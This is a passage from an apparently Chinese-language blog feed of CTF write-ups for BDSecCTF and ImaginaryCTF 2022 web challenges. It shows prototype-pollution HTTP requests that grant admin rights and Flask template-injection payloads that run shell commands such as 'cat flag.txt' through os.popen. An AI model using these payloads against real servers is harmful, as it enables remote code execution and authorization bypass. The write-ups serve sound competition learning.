class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/sell&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(req.<span class="property">body</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;flags&#x27;</span> &amp;&amp; !req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!products[key]) &#123;</span><br><span class="line">            products[key] = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(product));        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> [k, v] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(value)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k === <span class="string">&#x27;quantity&#x27;</span>) &#123;</span><br><span class="line">                products[key][k] += v;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                products[key][k] = v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Sell successful&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>&#x2F;api&#x2F;v1&#x2F;buy 购买相关产品</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/buy&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; product, quantity &#125; = req.<span class="property">body</span>;     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> product === <span class="string">&#x27;undefined&#x27;</span> || <span class="keyword">typeof</span> quantity !== <span class="string">&#x27;number&#x27;</span> || quantity &lt;= <span class="number">0</span> || !products[product]) &#123;    <span class="comment">//products[product]要存在</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid request&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (products[product].<span class="property">quantity</span> &gt;= quantity) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">money</span> &gt;= products[product].<span class="property">price</span> * quantity) &#123;</span><br><span class="line">            products[product].<span class="property">quantity</span> -= quantity;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">money</span> -= products[product].<span class="property">price</span> * quantity;</span><br><span class="line">            res.<span class="title function_">json</span>(products[product]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">402</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not enough money&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">451</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not enough product&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="3"><li>&#x2F;api&#x2F;v1&#x2F;money 可以修改金额</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/v1/money&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">money</span> += req.<span class="property">body</span>.<span class="property">money</span>;    </span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Money added&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not admin&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中&#x2F;api&#x2F;v1&#x2F;sell存在<code>原型链污染</code></p><p>第一步，通过链污染修改<code>req.session.admin为true</code>，覆盖flags的price为1</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721144112916.png" alt="image-20220721144112916"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/sell HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">206.189</span>.<span class="number">236.145</span>:<span class="number">3000</span></span><br><span class="line">Content-Length: <span class="number">48</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">5060.114</span> Safari/<span class="number">537.36</span> Edg/<span class="number">103.0</span>.<span class="number">1264.62</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Origin: http://206.189.236.145:3000</span></span><br><span class="line"><span class="comment">Referer: http://206.189.236.145:3000/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: connect.sid=s%3AhXJloF5ZCExKQ8ackKCPnlbWgVmBlFUx.63vNgL4nwnZ31RWXUsA9JNCPngfkG7XARAhedfxam0M</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;__proto__&quot;:&#123;&quot;admin&quot;:true&#125;,&quot;flags&quot;:&#123;&quot;price&quot;:1&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721143941235.png" alt="image-20220721143941235"></p><p>造成的结果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721144203842.png" alt="image-20220721144203842"></p><p>第二步，直接购买flags，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/buy HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">206.189</span>.<span class="number">236.145</span>:<span class="number">3000</span></span><br><span class="line">Content-Length: <span class="number">32</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">5060.114</span> Safari/<span class="number">537.36</span> Edg/<span class="number">103.0</span>.<span class="number">1264.62</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Origin: http://206.189.236.145:3000</span></span><br><span class="line"><span class="comment">Referer: http://206.189.236.145:3000/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: connect.sid=s%3AhXJloF5ZCExKQ8ackKCPnlbWgVmBlFUx.63vNgL4nwnZ31RWXUsA9JNCPngfkG7XARAhedfxam0M</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;product&quot;:&quot;flags&quot;,&quot;quantity&quot;:1&#125;</span></span><br></pre></td></tr></table></figure><p><img src="E:\markdown\img\image-20220721144002542-16613913650561.png" alt="image-20220721144002542"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> BDSecCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ImaginaryCTF2022-Web</title>
      <link href="/2022/07/19/ImaginaryCTF2022-Web/"/>
      <url>/2022/07/19/ImaginaryCTF2022-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="ImaginaryCTF2022"><a href="#ImaginaryCTF2022" class="headerlink" title="ImaginaryCTF2022"></a>ImaginaryCTF2022</h1><p>[toc]</p><p>平台链接：<a href="https://2022.imaginaryctf.org/">Home Page - ImaginaryCTF</a></p><h2 id="button"><a href="#button" class="headerlink" title="button"></a>button</h2><p>瞎点，出现了</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719225522358.png" alt="image-20220719225522358"></p><p>然后搜索alert，发现这个东西</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220716231559412.png" alt="image-20220716231559412"></p><p>控制台执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">motSusfunclion</span>()</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719101656785.png" alt="image-20220719101656785"></p><h2 id="rooCookie"><a href="#rooCookie" class="headerlink" title="rooCookie"></a>rooCookie</h2><p>关键代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createToken</span>(<span class="params">text</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> encrypted = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; text.<span class="property">length</span>; i++) &#123;</span><br><span class="line">encrypted += ((text[i].<span class="title function_">charCodeAt</span>(<span class="number">0</span>)-<span class="number">43</span>+<span class="number">1337</span>) &gt;&gt; <span class="number">0</span>).<span class="title function_">toString</span>(<span class="number">2</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">cookie</span> = encrypted</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;token=101100000111011000000110101110011101100000001010111110010101101111101011110111010111001110101001011101001100001011000000010101111101101011111011010011000010100101110101001101001010010111010101111110101011011111011000000110110000001101100001011010111110110110000000101011100101010100101110100110000101011101111010111000110110000010101011101001011000100110101110110101001111101010111111010101000001101011011011010100010110101110110101011011111010100010110101101101101100001011010110111110101000011101011111001010100010110101101101101100000101010011111010100111110101011011011010111000010101000010101011100101011000101110100110000&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>已知的是加密后的数据，我们根据这个信息来写逆向解密脚本</p><p>相关函数</p><p>charCodeAt() 方法可返回指定位置的字符的 Unicode 编码。这个返回值是 0 - 65535 之间的整数。</p><p>根据可显示字符对应的是32到127左右的字符，同时-43+1337也就是+1294，所以可以根据这个判断转为二进制后，都是11位的二进制字符串</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719004344083.png" alt="image-20220719004344083"></p><p>然后写逆向脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cut_text</span>(<span class="params">text,lenth</span>):</span><br><span class="line">  textArr = re.findall(<span class="string">&#x27;.&#123;&#x27;</span>+<span class="built_in">str</span>(lenth)+<span class="string">&#x27;&#125;&#x27;</span>, text)</span><br><span class="line">  textArr.append(text[(<span class="built_in">len</span>(textArr)*lenth):])</span><br><span class="line">  <span class="keyword">return</span> textArr</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;101100000111011000000110101110011101100000001010111110010101101111101011110111010111001110101001011101001100001011000000010101111101101011111011010011000010100101110101001101001010010111010101111110101011011111011000000110110000001101100001011010111110110110000000101011100101010100101110100110000101011101111010111000110110000010101011101001011000100110101110110101001111101010111111010101000001101011011011010100010110101110110101011011111010100010110101101101101100001011010110111110101000011101011111001010100010110101101101101100000101010011111010100111110101011011011010111000010101000010101011100101011000101110100110000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cut_text(token,<span class="number">11</span>)) <span class="comment"># 分为57个长度为11的二进制字符串</span></span><br><span class="line"></span><br><span class="line">s = cut_text(token,<span class="number">11</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">  a = <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+i,<span class="number">2</span>)-<span class="number">1294</span>)</span><br><span class="line">  flag += a</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719004426066.png" alt="image-20220719004426066"></p><p>username&#x3D;”roo” &amp; password&#x3D;”ictf{h0p3_7ha7_wa5n7_t00_b4d}”</p><h2 id="minigolf"><a href="#minigolf" class="headerlink" title="minigolf"></a>minigolf</h2><p>题目很明显，flask模板注入，但是过滤了<code>[&quot;&#123;&#123;", "&#125;&#125;&quot;, &quot;[&quot;, &quot;]&quot;, &quot;_&quot;]</code>，同时字符串长度限制了69</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, Response</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;_&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">  <span class="built_in">print</span>(request.args)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;txt&quot;</span> <span class="keyword">in</span> request.args.keys():</span><br><span class="line">    txt = html.escape(request.args[<span class="string">&quot;txt&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>([n <span class="keyword">in</span> txt <span class="keyword">for</span> n <span class="keyword">in</span> blacklist]):</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Not allowed.&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(txt) &lt;= <span class="number">69</span>:</span><br><span class="line">      <span class="keyword">return</span> render_template_string(txt)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Too long.&quot;</span></span><br><span class="line">  <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>使用config.update</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>%20config.update(a=request.args.a)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;a=__globals__</span><br><span class="line">&#123;%<span class="keyword">if</span>%20config.update(g=request.args.g)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;g=ls</span><br><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(config.a)).os.popen(config.g).read()%&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719203914568.png" alt="image-20220719203914568"></p><p>然后将第二个修改为<code>cat flag.txt</code></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>%20config.update(a=request.args.a)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;a=__globals__</span><br><span class="line">&#123;%<span class="keyword">if</span>%20config.update(g=request.args.g)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;g=cat%20flag.txt</span><br><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(config.a)).os.popen(config.g).read()%&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719204058013.png" alt="image-20220719204058013"></p><h2 id="Democracy"><a href="#Democracy" class="headerlink" title="Democracy"></a>Democracy</h2><p>直接就显示flag了</p><p><code>ictf&#123;i&#39;m_sure_you_0btained_this_flag_with0ut_any_sort_of_trickery...&#125;</code></p><h2 id="SSTI-Golf"><a href="#SSTI-Golf" class="headerlink" title="SSTI Golf"></a>SSTI Golf</h2><p>python的模板注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>():</span><br><span class="line">    query = request.args[<span class="string">&#x27;query&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;query&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">else</span> <span class="string">&#x27;...&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(query) &gt; <span class="number">48</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too long!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(query)</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//sstigolf.chal.imaginaryctf.org/ssti?query=&#123;&#123;7*7&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>回显49</p><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//sstigolf.chal.imaginaryctf.org/ssti?query=&#123;&#123;lipsum.__globals__.os.popen(%27whoami%27).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>回显root，将命令换为<code>cat *</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//sstigolf.chal.imaginaryctf.org/ssti?query=&#123;&#123;lipsum.__globals__.os.popen(%27cat%20*%27).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220718223727617.png" alt="image-20220718223727617"></p><p>ictf{F!1+3r5s!?}</p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>使用<code>config.update</code>，将相关函数写入config中</p><p>本题因为限制了字符串长度，所以使用即可</p><p>下面这个已知修改config中a的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.update(a=lipsum)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(a=config[%27a%<span class="number">27</span>].__globals__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(a=config[%27a%<span class="number">27</span>].__builtins__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(a=config[%27a%<span class="number">27</span>].<span class="built_in">eval</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;config.a(request.args.b)&#125;&#125;&amp;b=<span class="built_in">__import__</span>(%27os%<span class="number">27</span>).popen(%27<span class="built_in">id</span>%<span class="number">27</span>).read()</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719202212921.png" alt="image-20220719202212921"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.update(&#123;<span class="string">&quot;a&quot;</span>:cycler.__init__&#125;)&#125;&#125;</span><br><span class="line">&#123;&#123;config.a.__globals__.os.popen(<span class="string">&quot;nl%20*&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719202324050.png" alt="image-20220719202324050"></p><p>下面这个题目不是该比赛中的题目，是这个平台daily challenge里面的一个题目</p><h2 id="daliy-challenge"><a href="#daliy-challenge" class="headerlink" title="daliy challenge"></a>daliy challenge</h2><h3 id="Almost-SSTI"><a href="#Almost-SSTI" class="headerlink" title="Almost SSTI"></a>Almost SSTI</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>():</span><br><span class="line">    query = request.args[<span class="string">&#x27;query&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(query) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too long!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(query)</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">3002</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>debug模式是开启的，构造报错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//puzzler7.imaginaryctf.org:3002/ssti?query[]=</span></span><br><span class="line"><span class="title function_ invoke__">__import__</span>(<span class="string">&quot;os&quot;</span>).<span class="title function_ invoke__">popen</span>(<span class="string">&quot;ls&quot;</span>).read</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719225636877.png" alt="image-20220719225636877"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> ImaginaryCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年蓝贝国际创新创业大赛数字技术+信息安全领域赛道网络攻防大赛wp</title>
      <link href="/2022/07/15/2022%E5%B9%B4%E8%93%9D%E8%B4%9D%E5%9B%BD%E9%99%85%E5%88%9B%E6%96%B0%E5%88%9B%E4%B8%9A%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E6%8A%80%E6%9C%AF-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E8%B5%9B%E9%81%93%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9Bwp/"/>
      <url>/2022/07/15/2022%E5%B9%B4%E8%93%9D%E8%B4%9D%E5%9B%BD%E9%99%85%E5%88%9B%E6%96%B0%E5%88%9B%E4%B8%9A%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E6%8A%80%E6%9C%AF-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E8%B5%9B%E9%81%93%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9Bwp/</url>
      
